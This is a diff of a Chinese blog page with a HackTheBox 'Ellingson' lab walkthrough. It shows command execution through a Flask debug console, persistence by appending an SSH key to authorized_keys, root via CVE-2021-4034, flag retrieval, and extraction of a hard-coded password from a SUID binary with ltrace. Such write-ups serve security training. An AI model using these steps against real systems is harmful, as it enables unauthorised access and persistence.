-<h2 id="Ellingson"><a href="#Ellingson" class="headerlink" title="Ellingson"></a>Ellingson</h2><h3 id="Nmap-3"><a href="#Nmap-3" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-23 11:27 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.139</span><br><span class="line">Host is up (0.092s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)</span><br><span class="line">|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:<span class="built_in">df</span> (ECDSA)</span><br><span class="line">|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">| http-title: Ellingson Mineral Corp</span><br><span class="line">|_Requested resource was http://10.10.10.139/index</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.03 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Ellingson"><a href="#Ellingson" class="headerlink" title="Ellingson"></a>Ellingson</h2><h3 id="Nmap-3"><a href="#Nmap-3" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-23 11:27 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.139<br>Host is up (0.092s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)<br>|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:<span class="hljs-built_in">df</span> (ECDSA)<br>|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)<br>80/tcp open  http    nginx 1.14.0 (Ubuntu)<br>| http-title: Ellingson Mineral Corp<br>|_Requested resource was http://10.10.10.139/index<br>|_http-server-header: nginx/1.14.0 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.03 seconds<br><br></code></pre></td></tr></table></figure>
 
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问80端口后，在源码、robots.txt无发现，使用<code>wappalyzer</code>进行网站识别</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223122852477.png" alt="image-20221223122852477"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223122852477.png" srcset="/img/loading.gif" lazyload alt="image-20221223122852477"></p>
 <p>尝试web目录扫描，<code>dirsearch</code>，找到两个4xx的路径，无关键信息</p>
 <p>回到页面，如下存在可能sqli的点，sqlmap后未果</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223124655298.png" alt="image-20221223124655298"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223124655298.png" srcset="/img/loading.gif" lazyload alt="image-20221223124655298"></p>
 <p>尝试手动输入<code>http://10.10.10.139/articles/1&#39;</code></p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223144625162.png" alt="image-20221223144625162"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223144625162.png" srcset="/img/loading.gif" lazyload alt="image-20221223144625162"></p>
 <p>Flask框架debug模式提供了交互式的shell</p>
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; proc = subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=True)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(proc.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">hal</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; proc = subprocess.check_output(<span class="string">&#x27;ls -la /home/hal/&#x27;</span>, shell=True)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(proc.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">total 36</span><br><span class="line">drwxrwx--- 5 hal  hal  4096 Jul 16  2021 .</span><br><span class="line">drwxr-xr-x 6 root root 4096 Jul 16  2021 ..</span><br><span class="line">-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc</span><br><span class="line">drwx------ 2 hal  hal  4096 Jul 16  2021 .cache</span><br><span class="line">drwx------ 3 hal  hal  4096 Jul 16  2021 .gnupg</span><br><span class="line">-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile</span><br><span class="line">drwx------ 2 hal  hal  4096 Jul 16  2021 .ssh</span><br><span class="line">-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt;&gt; proc = subprocess.check_output(<span class="hljs-string">&#x27;whoami&#x27;</span>, shell=True)<br>&gt;&gt;&gt; <span class="hljs-built_in">print</span>(proc.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>hal<br><br>&gt;&gt;&gt; proc = subprocess.check_output(<span class="hljs-string">&#x27;ls -la /home/hal/&#x27;</span>, shell=True)<br>&gt;&gt;&gt; <span class="hljs-built_in">print</span>(proc.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>total 36<br>drwxrwx--- 5 hal  hal  4096 Jul 16  2021 .<br>drwxr-xr-x 6 root root 4096 Jul 16  2021 ..<br>-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout<br>-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc<br>drwx------ 2 hal  hal  4096 Jul 16  2021 .cache<br>drwx------ 3 hal  hal  4096 Jul 16  2021 .gnupg<br>-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile<br>drwx------ 2 hal  hal  4096 Jul 16  2021 .ssh<br>-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo<br><br><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223145941693.png" alt="image-20221223145941693"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223145941693.png" srcset="/img/loading.gif" lazyload alt="image-20221223145941693"></p>
 <p>追加本机的公钥到authorized_keys文件，登录主机</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;&gt;&gt; proc = subprocess.check_output(<span class="string">&#x27;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRYSlNFZdy7DLsR7DIba0pEkxPfqNM2urzPNpo/TcXgzpHEj37vprc5DczcBZBZY61xou03ah/cMeNUeiB70s8n8IOdI1+0GZpuW0NtPxKw2/vNnyg+VEsn9fKvCAybtX6hautLgTQ/3I6QHMZDwq527GLNRdvpjuEhbGcD/wDj1j+WoyquspAMze79gKZsClE5rw8Y1W9X3zpp9ZqJ5/33ZnjQWhvinn0k5quIQNLnYu7D1Ixk6/1taVT5YCYHthUntnWAfhJBYPJF7A6tG6h8BIHmPa+R0P0M/LX04YNVevgAtd3Mog8bsS8jNaNo7/Ki5anPErGkCt9SeJ4haHNTB9QyOmLmAqr91J6zfi/ooNcw89UGfQ33MpyueAw1hEnTl2AD5EUf+tFyIoeSDzVYmxO/i6M4vVnFlFrc9EO+R80dKu6+/kIM0nt9F8flrG6n56fLZ8q2OeXNP743MHGEACrV7jhRRNfej4o/xQDtQ208niOzWFUHixH9f/2rsE= tiger@kali&quot; &gt;&gt; /home/hal/.ssh/authorized_keys&#x27;</span>, shell=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>&gt;&gt;&gt; proc = subprocess.check_output(<span class="hljs-string">&#x27;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRYSlNFZdy7DLsR7DIba0pEkxPfqNM2urzPNpo/TcXgzpHEj37vprc5DczcBZBZY61xou03ah/cMeNUeiB70s8n8IOdI1+0GZpuW0NtPxKw2/vNnyg+VEsn9fKvCAybtX6hautLgTQ/3I6QHMZDwq527GLNRdvpjuEhbGcD/wDj1j+WoyquspAMze79gKZsClE5rw8Y1W9X3zpp9ZqJ5/33ZnjQWhvinn0k5quIQNLnYu7D1Ixk6/1taVT5YCYHthUntnWAfhJBYPJF7A6tG6h8BIHmPa+R0P0M/LX04YNVevgAtd3Mog8bsS8jNaNo7/Ki5anPErGkCt9SeJ4haHNTB9QyOmLmAqr91J6zfi/ooNcw89UGfQ33MpyueAw1hEnTl2AD5EUf+tFyIoeSDzVYmxO/i6M4vVnFlFrc9EO+R80dKu6+/kIM0nt9F8flrG6n56fLZ8q2OeXNP743MHGEACrV7jhRRNfej4o/xQDtQ208niOzWFUHixH9f/2rsE= tiger@kali&quot; &gt;&gt; /home/hal/.ssh/authorized_keys&#x27;</span>, shell=True)<br><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223151300472.png" alt="image-20221223151300472"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223151300472.png" srcset="/img/loading.gif" lazyload alt="image-20221223151300472"></p>
 <p>用户信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hal@ellingson:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(hal) gid=1001(hal) <span class="built_in">groups</span>=1001(hal),4(adm)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hal@ellingson:~$ <span class="hljs-built_in">id</span><br>uid=1001(hal) gid=1001(hal) <span class="hljs-built_in">groups</span>=1001(hal),4(adm)<br><br></code></pre></td></tr></table></figure>
 
 <p>用户除了在组hal之外还在adm组中，搜索adm组相关的文件信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">hal@ellingson:~$ find / -group adm 2&gt;/dev/null</span><br><span class="line">/var/spool/rsyslog</span><br><span class="line">/var/log/auth.log</span><br><span class="line">/var/log/mail.err.1</span><br><span class="line">/var/log/mail.err</span><br><span class="line">/var/log/fail2ban.log.1</span><br><span class="line">/var/log/fail2ban.<span class="built_in">log</span></span><br><span class="line">/var/log/kern.log</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/nginx</span><br><span class="line">/var/log/nginx/error.log.1</span><br><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/access.log.1</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/cloud-init.log</span><br><span class="line">/var/log/kern.log.1</span><br><span class="line">/var/log/unattended-upgrades</span><br><span class="line">/var/log/syslog.1</span><br><span class="line">/var/log/apt/term.log</span><br><span class="line">/var/log/apt/term.log.1.gz</span><br><span class="line">/var/log/auth.log.1</span><br><span class="line">/var/log/apport.log</span><br><span class="line">/var/log/mail.log.1</span><br><span class="line">/var/log/apport.log.1</span><br><span class="line">/var/log/mail.log</span><br><span class="line">/snap/core/6405/var/log/dmesg</span><br><span class="line">/snap/core/6405/var/log/fsck/checkfs</span><br><span class="line">/snap/core/6405/var/log/fsck/checkroot</span><br><span class="line">/snap/core/6405/var/spool/rsyslog</span><br><span class="line">/snap/core/4917/var/log/dmesg</span><br><span class="line">/snap/core/4917/var/log/fsck/checkfs</span><br><span class="line">/snap/core/4917/var/log/fsck/checkroot</span><br><span class="line">/snap/core/4917/var/spool/rsyslog</span><br><span class="line">/snap/core/6818/var/log/dmesg</span><br><span class="line">/snap/core/6818/var/log/fsck/checkfs</span><br><span class="line">/snap/core/6818/var/log/fsck/checkroot</span><br><span class="line">/snap/core/6818/var/spool/rsyslog</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">hal@ellingson:~$ find / -group adm 2&gt;/dev/null<br>/var/spool/rsyslog<br>/var/log/auth.log<br>/var/log/mail.err.1<br>/var/log/mail.err<br>/var/log/fail2ban.log.1<br>/var/log/fail2ban.<span class="hljs-built_in">log</span><br>/var/log/kern.log<br>/var/log/syslog<br>/var/log/nginx<br>/var/log/nginx/error.log.1<br>/var/log/nginx/error.log<br>/var/log/nginx/access.log.1<br>/var/log/nginx/access.log<br>/var/log/cloud-init.log<br>/var/log/kern.log.1<br>/var/log/unattended-upgrades<br>/var/log/syslog.1<br>/var/log/apt/term.log<br>/var/log/apt/term.log.1.gz<br>/var/log/auth.log.1<br>/var/log/apport.log<br>/var/log/mail.log.1<br>/var/log/apport.log.1<br>/var/log/mail.log<br>/snap/core/6405/var/log/dmesg<br>/snap/core/6405/var/log/fsck/checkfs<br>/snap/core/6405/var/log/fsck/checkroot<br>/snap/core/6405/var/spool/rsyslog<br>/snap/core/4917/var/log/dmesg<br>/snap/core/4917/var/log/fsck/checkfs<br>/snap/core/4917/var/log/fsck/checkroot<br>/snap/core/4917/var/spool/rsyslog<br>/snap/core/6818/var/log/dmesg<br>/snap/core/6818/var/log/fsck/checkfs<br>/snap/core/6818/var/log/fsck/checkroot<br>/snap/core/6818/var/spool/rsyslog<br><br></code></pre></td></tr></table></figure>
 
 <p>在各种wrieup中提到去<code>/var/backups</code>文件夹的shadow.bak进行密码爆破（该文件adm组当时的时间有可读权限，实际没有），后来我先用linpeas.sh扫描后发现有可利用的<strong>CVE-2021-4034</strong>，并最终提权成功。</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223172435203.png" alt="image-20221223172435203"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223172435203.png" srcset="/img/loading.gif" lazyload alt="image-20221223172435203"></p>
 <p>检查用户目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls /home/duke</span></span><br><span class="line"><span class="comment"># ls /home/margo</span></span><br><span class="line">user.txt</span><br><span class="line"><span class="comment"># cat /home/margo/user.txt</span></span><br><span class="line">961f61abaa1d62b62c009aea90fdf6b1</span><br><span class="line"><span class="comment"># ls /home/theplague</span></span><br><span class="line">ensure-message-present.sh  mbox</span><br><span class="line"><span class="comment"># cat /home/theplague/ensure-message-present.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> -f /home/theplague/mbox /home/hal/mbox</span><br><span class="line"><span class="built_in">chown</span> hal:hal /home/hal/mbox</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ls /home/duke</span><br><span class="hljs-comment"># ls /home/margo</span><br>user.txt<br><span class="hljs-comment"># cat /home/margo/user.txt</span><br>961f61abaa1d62b62c009aea90fdf6b1<br><span class="hljs-comment"># ls /home/theplague</span><br>ensure-message-present.sh  mbox<br><span class="hljs-comment"># cat /home/theplague/ensure-message-present.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cp</span> -f /home/theplague/mbox /home/hal/mbox<br><span class="hljs-built_in">chown</span> hal:hal /home/hal/mbox<br><span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure>
 
 <p>检查root目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls /root</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">a5548c2205e2ee4cc4de3f03282b6b0b</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ls /root</span><br>root.txt<br><span class="hljs-comment"># cat /root/root.txt</span><br>a5548c2205e2ee4cc4de3f03282b6b0b<br></code></pre></td></tr></table></figure>
 
 <p>好像已经搞定了，感觉像走了捷径。找找其他的答案</p>
 <h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>查找suid文件</p>
-<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223192705085.png" alt="image-20221223192705085"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221223192705085.png" srcset="/img/loading.gif" lazyload alt="image-20221223192705085"></p>
 <p>有一个非标准的二进制程序：garbage</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hal@ellingson:/tmp/CVE-2021-4034$ ./cve-2021-4034</span><br><span class="line"><span class="comment"># 这里hal用户是无法执行garbage程序的</span></span><br><span class="line"><span class="comment"># su margo</span></span><br><span class="line">margo@ellingson:/tmp/CVE-2021-4034$ garbage </span><br><span class="line">Enter access password: hello,world</span><br><span class="line"></span><br><span class="line">access denied.</span><br><span class="line">margo@ellingson:/tmp/CVE-2021-4034$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">hal@ellingson:/tmp/CVE-2021-4034$ ./cve-2021-4034<br><span class="hljs-comment"># 这里hal用户是无法执行garbage程序的</span><br><span class="hljs-comment"># su margo</span><br>margo@ellingson:/tmp/CVE-2021-4034$ garbage <br>Enter access password: hello,world<br><br>access denied.<br>margo@ellingson:/tmp/CVE-2021-4034$ <br><br></code></pre></td></tr></table></figure>
 
 <p>使用<code>ltrace</code>进行库函数调用跟踪</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">margo@ellingson:/tmp/CVE-2021-4034$ garbage </span><br><span class="line">Enter access password: hello,world</span><br><span class="line"></span><br><span class="line">access denied.</span><br><span class="line">margo@ellingson:/tmp/CVE-2021-4034$ ltrace garbage </span><br><span class="line">getuid()                                                      = 1002</span><br><span class="line">syslog(6, <span class="string">&quot;user: %lu cleared to access this&quot;</span>..., 1002)        = &lt;void&gt;</span><br><span class="line">getpwuid(1002, 0x1720030, 0x1720010, 1)                       = 0x7f1304ac4f20</span><br><span class="line">strcpy(0x7ffe294f3ba4, <span class="string">&quot;margo&quot;</span>)                               = 0x7ffe294f3ba4</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter access password: &quot;</span>)                             = 23</span><br><span class="line">gets(0x7ffe294f3b40, 0x1721b90, 0, 0Enter access password: hello</span><br><span class="line">)                         = 0x7ffe294f3b40</span><br><span class="line">putchar(10, 0x1721fa5, 0x7f1304ac48d0, 0x7f1304ac2a00</span><br><span class="line">)        = 10</span><br><span class="line">strcmp(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;N3veRF3@r1iSh3r3!&quot;</span>)                          = 26</span><br><span class="line">puts(<span class="string">&quot;access denied.&quot;</span>access denied.</span><br><span class="line">)                                        = 15</span><br><span class="line"><span class="built_in">exit</span>(-1 &lt;no <span class="built_in">return</span> ...&gt;</span><br><span class="line">+++ exited (status 255) +++</span><br><span class="line">margo@ellingson:/tmp/CVE-2021-4034$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">margo@ellingson:/tmp/CVE-2021-4034$ garbage <br>Enter access password: hello,world<br><br>access denied.<br>margo@ellingson:/tmp/CVE-2021-4034$ ltrace garbage <br>getuid()                                                      = 1002<br>syslog(6, <span class="hljs-string">&quot;user: %lu cleared to access this&quot;</span>..., 1002)        = &lt;void&gt;<br>getpwuid(1002, 0x1720030, 0x1720010, 1)                       = 0x7f1304ac4f20<br>strcpy(0x7ffe294f3ba4, <span class="hljs-string">&quot;margo&quot;</span>)                               = 0x7ffe294f3ba4<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter access password: &quot;</span>)                             = 23<br>gets(0x7ffe294f3b40, 0x1721b90, 0, 0Enter access password: hello<br>)                         = 0x7ffe294f3b40<br>putchar(10, 0x1721fa5, 0x7f1304ac48d0, 0x7f1304ac2a00<br>)        = 10<br>strcmp(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;N3veRF3@r1iSh3r3!&quot;</span>)                          = 26<br>puts(<span class="hljs-string">&quot;access denied.&quot;</span>access denied.<br>)                                        = 15<br><span class="hljs-built_in">exit</span>(-1 &lt;no <span class="hljs-built_in">return</span> ...&gt;<br>+++ exited (status 255) +++<br>margo@ellingson:/tmp/CVE-2021-4034$ <br><br></code></pre></td></tr></table></figure>
 
 <p>再次运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">margo@ellingson:/tmp/CVE-2021-4034$ garbage </span><br><span class="line">Enter access password: N3veRF3@r1iSh3r3!</span><br><span class="line"></span><br><span class="line">access granted.</span><br><span class="line">[+] W0rM || Control Application</span><br><span class="line">[+] ---------------------------</span><br><span class="line">Select Option</span><br><span class="line">1: Check Balance</span><br><span class="line">2: Launch</span><br><span class="line">3: Cancel</span><br><span class="line">4: Exit</span><br><span class="line">&gt; 1</span><br><span class="line">Balance is <span class="variable">$1337</span></span><br><span class="line">&gt; 2</span><br><span class="line">Row Row Row Your Boat...</span><br><span class="line">&gt; 1</span><br><span class="line">Balance is <span class="variable">$1337</span></span><br><span class="line">&gt; 3</span><br><span class="line">The tankers have stopped capsizing</span><br><span class="line">&gt; 4</span><br><span class="line">margo@ellingson:/tmp/CVE-2021-4034$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
